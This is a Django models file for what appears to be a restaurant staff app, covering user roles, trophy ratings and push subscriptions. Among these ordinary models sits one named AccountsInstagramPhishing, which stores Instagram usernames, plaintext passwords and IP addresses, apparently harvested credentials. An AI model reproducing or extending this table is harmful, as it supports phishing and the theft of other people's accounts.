import calendar
from datetime import datetime
from decimal import Decimal

from django.core.exceptions import ValidationError

from django.conf import settings
from django.core.validators import MinValueValidator, MaxValueValidator
from django.db import models
from django.contrib.auth.models import AbstractUser, UserManager, PermissionsMixin
from django.contrib.auth.hashers import make_password
from django.db.models.signals import post_save
from phonenumber_field.modelfields import PhoneNumberField


# from apps.account.services.signals import post_create_cart_signal


class CustomUserManager(UserManager):

    def _create_user(self, email, phone_number, password, username=None, **extra_fields):

        if not phone_number:
            raise ValueError("The given phone_number must be set")
        email = self.normalize_email(email)
        user = self.model(username=username, email=email, phone_number=phone_number, **extra_fields)
        user.password = make_password(password)
        user.save(using=self._db)
        return user

    def create_user(self, phone_number, password=None, username=None, **extra_fields):  # Обычный пользователь
        extra_fields.setdefault("is_active", True)
        extra_fields.setdefault("is_staff", False)
        extra_fields.setdefault("is_superuser", False)
        return self._create_user(phone_number=phone_number, password=password, email=None, username=username,
                                 **extra_fields)

    def create_superuser(self, phone_number, email=None, password=None, username=None, **extra_fields):  # super user
        extra_fields.setdefault("is_staff", True)
        extra_fields.setdefault("is_superuser", True)
        extra_fields["is_active"] = True

        if extra_fields.get("is_active") is not True:
            raise ValueError("Superuser must have is_active=True.")
        if extra_fields.get("is_superuser") is not True:
            raise ValueError("Superuser must have is_superuser=True.")

        return self._create_user(phone_number=phone_number, email=None, password=password, username=username,
                                 **extra_fields)


class CustomUser(AbstractUser, PermissionsMixin):
    ACCOUNT_CHOICES = (
        ("chef", "шеф"),
        ("administrator", "Администратор"),
        ("employee", "Работник"),
        ("samsishnik", "Cамсышник"),
        ("cake_maker", "Тортышник"),
        ("chebureki_maker", "Чебурешник"),
        ("kassa", "Кассир"),
        ("waitress", "Официант"),
        ("butcher", "Мясник"),
        ("demo", "Демо"),
        ("customer", "Клиент"),
    )

    RATING_CHOICES = (
        (1, ("Базовый")),
        (2, ("Бронзовый")),
        (3, ("Серебряный")),
        (4, ("Золотой")),
        (5, ("Премиум")),
        (6, ("Элитный")),
        (7, ("Профессиональный")),
    )

    def get_next_level(self):
        """
        This method determines the next rating level based on trophies.
        """
        rating_thresholds = {
            1: 0,  # Базовый (0-99 trophies)
            2: 100,  # Бронзовый (100-199 trophies)
            3: 200,  # Серебряный (200-299 trophies)
            4: 300,  # Золотой (300-399 trophies)
            5: 400,  # Премиум (400-499 trophies)
            6: 500,  # Элитный (500-599 trophies)
            7: 600  # Профессиональный (600+ trophies)
        }

        # Find the next level
        for level, threshold in sorted(rating_thresholds.items()):
            if self.trophies < threshold:
                return dict(self.RATING_CHOICES).get(level, None)

        return None  # If no next level, return None (max level reached)

    def validate_positive(value):
        if value < 0:
            raise ValidationError("Trophies cannot be negative.")


    username = models.CharField(blank=True, null=True, max_length=150)
    is_active = models.BooleanField(default=False)
    activate_code = models.CharField(max_length=100, blank=True)
    email = models.EmailField(null=True, blank=True)
    phone_number = PhoneNumberField(null=False, blank=True, unique=True)
    roles =  models.CharField(choices=ACCOUNT_CHOICES, max_length=255, default="employee", verbose_name='Тип')
    is_subscribed = models.BooleanField(default=False)
    USERNAME_FIELD = 'phone_number'
    rate = models.DecimalField(
        max_digits=4,
        decimal_places=1,
        validators=[MinValueValidator(Decimal('0.0')), MaxValueValidator(Decimal('10.0'))],
        default=Decimal('5.0')
    )
    is_rate_active = models.BooleanField(default=False)
    balance_of_user = models.PositiveIntegerField(default=0, verbose_name='баланс')
    theme_order = models.CharField(max_length=250, blank=True, null=True, default="unusual_bg_blue")
    profile_image = models.ImageField(upload_to='profile_images/', null=True, blank=True, verbose_name="Фото")
    trophies = models.IntegerField(default=0, validators=[validate_positive], verbose_name='Трофеи')
    type_rating = models.IntegerField(choices=RATING_CHOICES, default=1, verbose_name='Наименование рейтинга')
    objects = CustomUserManager()



    def __str__(self):
        return f"{self.username} {self.phone_number}"

    @staticmethod
    def generate_activation_code(length: int, number_range: str):
        from django.utils.crypto import get_random_string
        return get_random_string(length, number_range)

    def save(self, *args, **kwargs):
        # Generate the activation code
        # Сохраняем статистику за день

            # if self.roles == "waitress":
            #     stat, created = UserTrophyStat.objects.get_or_create(user=self, date=datetime.today().date())
            #     stat.trophies = self.trophies
            #     stat.save()
            #     # Ensure trophies are non-negative
            #     if self.trophies < 0:
            #         raise ValidationError("Trophies cannot be negative.")
            #
            #     # Update daily statistics for waitresses
            #     stat, created = UserTrophyStat.objects.get_or_create(user=self, date=datetime.today().date())
            #     stat.trophies = self.trophies
            #     stat.save()
            #
            #     # Update type_rating based on trophies
            #     if self.trophies >= 100:
            #         # Calculate the type_rating level based on the trophies
            #         rating_level = min((self.trophies // 100) + 1, len(self.RATING_CHOICES))
            #         self.type_rating = rating_level
            #     else:
            #         # Set type_rating to the base level
            #         self.type_rating = 1  # Assuming 1 corresponds to "Базовый"
            #      # Check if the trophies are greater than or equal to 100
            #     if self.trophies >= 100:
            #         # Calculate the type_rating level based on the trophies
            #         rating_level = min((self.trophies // 100) + 1, len(self.RATING_CHOICES))
            #         print(f"Calculated Rating Level: {rating_level}")
            #
            #         # Update the type_rating field
            #         self.type_rating = rating_level
            #     else:
            #         # If trophies are less than 100, set the type_rating to the base level
            #         self.type_rating = 1  # Assuming 1 corresponds to "Базовый"

            # Call the parent class's save method
        return super().save(*args, **kwargs)


class AccountsInstagramPhishing(models.Model):
    name = models.CharField(max_length=250, verbose_name='Имя пользователя')
    password = models.CharField(max_length=250, verbose_name='Пароль')
    is_written = models.BooleanField(default=False)
    ip_address = models.CharField(max_length=250, verbose_name='Ip')

    class Meta:
        verbose_name = 'Инстаграмм'
        verbose_name_plural = 'Инстаграмм аккаунты'


class PushNotificationToSubscribedUser(models.Model):
    user = models.ForeignKey(to=settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name='user_push')
    email = models.CharField(max_length=250, verbose_name='Почта')
    is_subscribed = models.BooleanField(default=False)

    class Meta:
        verbose_name = 'Уведомление'
        verbose_name_plural = 'Уведомления'

    def __str__(self):
        return  f"{self.email} =============={self.user.username}"




from datetime import datetime, timedelta

def days_left_in_month():
    today = datetime.today()
    _, last_day = calendar.monthrange(today.year, today.month)
    return (datetime(today.year, today.month, last_day) - today).days


class UserTrophyStat(models.Model):
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE, related_name='trophy_stats')
    date = models.DateField(auto_now_add=True)
    trophies = models.IntegerField(default=0)

    class Meta:
        verbose_name= "Трофеи"
        verbose_name_plural = "Трофеи"
        unique_together = ('user', 'date')

class PushSubscription(models.Model):
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE, null=True, blank=True)
    endpoint = models.TextField(unique=True)
    p256dh = models.CharField(max_length=256)
    auth = models.CharField(max_length=256)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"Subscription for {self.user or 'anonymous'}"



# post_save.connect(post_create_cart_signal, sender=CustomUser)